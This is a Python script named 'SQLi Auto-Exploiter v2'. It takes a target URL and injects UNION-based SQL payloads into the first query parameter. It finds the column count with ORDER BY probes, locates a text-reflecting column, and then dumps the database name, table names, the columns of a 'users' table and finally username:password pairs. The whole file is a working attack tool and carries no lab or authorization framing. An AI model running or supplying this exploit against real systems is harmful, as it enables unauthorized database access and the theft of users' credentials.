#!/usr/bin/env python3
import requests
import sys
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

HEADERS = {'User-Agent': 'Mozilla/5.0 (Security-Scanner)'}

ERROR_SIGNS = [
    'Internal Server Error',
    'SQL syntax',
    'mysql_fetch',
    'ORA-',
    'PostgreSQL',
    'SQLite',
    'ODBC',
    'syntax error',
]

def build_url(url, param, value):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [value]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))

def test_payload(url, param, payload, timeout=15):
    try:
        new_url = build_url(url, param, payload)
        r = requests.get(new_url, headers=HEADERS, timeout=timeout)
        return r
    except:
        return None

def has_error(r):
    """يفحص إذا الرد فيه خطأ"""
    if not r:
        return True
    text = r.text.lower()
    for sign in ERROR_SIGNS:
        if sign.lower() in text:
            return True
    return False

def find_columns(url, param):
    print(f"\n[*] Step 1: Finding number of columns...")
    time.sleep(0.5)
    
    for i in range(1, 11):
        payload = f"' ORDER BY {i}--"
        r = test_payload(url, param, payload)
        
        if has_error(r):
            print(f"  [+] Columns: {i-1}")
            return i - 1
        else:
            print(f"  [*] ORDER BY {i} OK")
        time.sleep(0.3)
    
    print(f"  [-] Could not determine columns")
    return None

def find_text_column(url, param, num_cols):
    print(f"\n[*] Step 2: Finding text column...")
    time.sleep(0.5)
    
    for i in range(num_cols):
        nulls = ['NULL'] * num_cols
        nulls[i] = "'test123'"
        payload = f"' UNION SELECT {','.join(nulls)}--"
        
        r = test_payload(url, param, payload)
        if r and 'test123' in r.text:
            print(f"  [+] Text column: {i + 1}")
            return i
        time.sleep(0.3)
    
    print(f"  [-] No text column found")
    return None

def extract_data(url, param, num_cols, text_col, query):
    try:
        nulls = ['NULL'] * num_cols
        nulls[text_col] = query
        payload = f"' UNION SELECT {','.join(nulls)}--"
        
        r = test_payload(url, param, payload)
        if not r:
            return []
        
        matches = re.findall(r'<th>([^<]+)</th>|<td>([^<]+)</td>', r.text)
        results = []
        for m in matches:
            val = m[0] or m[1]
            if val and val != 'NULL':
                results.append(val)
        return results
    except:
        return []

def auto_exploit(url):
    print(f"\n{'='*60}")
    print(f"  SQLi Auto-Exploiter v2")
    print(f"  Target: {url}")
    print(f"{'='*60}")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[-] No parameters found")
        return
    
    param = list(params.keys())[0]
    print(f"[*] Parameter: {param}")
    
    num_cols = find_columns(url, param)
    if not num_cols:
        return
    
    text_col = find_text_column(url, param, num_cols)
    if text_col is None:
        return
    
    print(f"\n{'='*60}")
    print(f"  EXTRACTION")
    print(f"{'='*60}")
    
    # Database name
    print(f"\n[*] Step 3: Database name...")
    result = extract_data(url, param, num_cols, text_col, "database()")
    if result:
        for r in result[:3]:
            print(f"  [+] {r}")
    
    # Tables
    print(f"\n[*] Step 4: Tables...")
    query = "GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
    result = extract_data(url, param, num_cols, text_col, query)
    if result:
        for r in result:
            if ',' in r:
                for t in r.split(','):
                    print(f"  [+] {t}")
    
    # Columns in users
    print(f"\n[*] Step 5: Columns in users...")
    query = "GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'"
    result = extract_data(url, param, num_cols, text_col, query)
    if result:
        for r in result:
            if ',' in r:
                for c in r.split(','):
                    print(f"  [+] {c}")
    
    # Credentials
    print(f"\n[*] Step 6: Credentials...")
    query = "GROUP_CONCAT(username,':',password) FROM users"
    result = extract_data(url, param, num_cols, text_col, query)
    if result:
        for r in result:
            if ':' in r:
                for cred in r.split(','):
                    if ':' in cred:
                        user, pwd = cred.split(':', 1)
                        print(f"  [+] {user}:{pwd}")
    
    print(f"\n{'='*60}")
    print(f"  DONE")
    print(f"{'='*60}\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 sqli_auto.py <url>")
        sys.exit(1)
    
    auto_exploit(sys.argv[1])
